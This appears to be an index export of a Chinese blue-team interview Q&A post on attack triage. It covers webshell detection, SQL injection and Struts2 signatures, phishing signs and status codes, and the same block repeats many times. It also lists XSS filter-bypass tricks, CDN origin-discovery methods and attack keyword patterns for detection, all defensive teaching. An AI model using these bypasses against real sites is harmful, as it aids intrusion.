，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#6liunx系统中任何权限都能访问的临时文件位置"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#7如何判断是钓鱼邮件"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#8waf和ips的区别"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#9拿到日志如何分析"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#10sql注入有哪些常见的特征"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#11xss弹窗函数和常见的xss绕过策略"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#12无文件webshell实现的方式有哪些"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 